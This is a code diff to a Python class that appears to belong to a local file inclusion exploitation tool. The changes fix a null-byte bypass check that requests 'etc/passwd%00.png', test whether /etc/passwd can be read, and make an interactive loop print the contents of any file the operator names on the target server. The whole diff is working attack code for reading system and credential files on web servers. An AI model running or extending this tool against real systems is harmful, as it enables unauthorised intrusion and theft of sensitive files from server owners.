@@ -17,10 +17,13 @@ class LocalFile:
         self.session.verify = False
 
     def exploit(self, format, is_null_byte=False):
-        if self.session.get(url=f"{format}etc/passwd").status_code != 200 or not is_success(self):
-            if self.session.get(url=f"{format}etc/passwd%00.png" != 200):
+        if is_null_byte:
+            if self.session.get(url=f"{format}etc/passwd%00.png").status_code != 200:
                 print("LFI method didn't work")
                 return False
+        if self.session.get(url=f"{format}etc/passwd").status_code != 200 or not is_success(self):
+            print("LFI method didn't work")
+            return False
         print(self.exploit_url)
         
         print(f"Exploitation successfull\nSide note: To quit, just enter stop ദ്ദി(｡•̀ ,<)~✩‧₊")
@@ -36,8 +39,10 @@ class LocalFile:
                 payload = payload_unfiltered.lstrip("/")
                 if is_null_byte == True:
                     file_upload_result = self.session.get(url=f"{format}{payload}%00.png")
+                    print(file_upload_result.text)
                 else:
                     file_upload_result = self.session.get(url=f"{format}{payload}")
+                    print(file_upload_result.text)
                 if file_upload_result.status_code != 200:
                     print("Network error. (TωT)")
                     return False
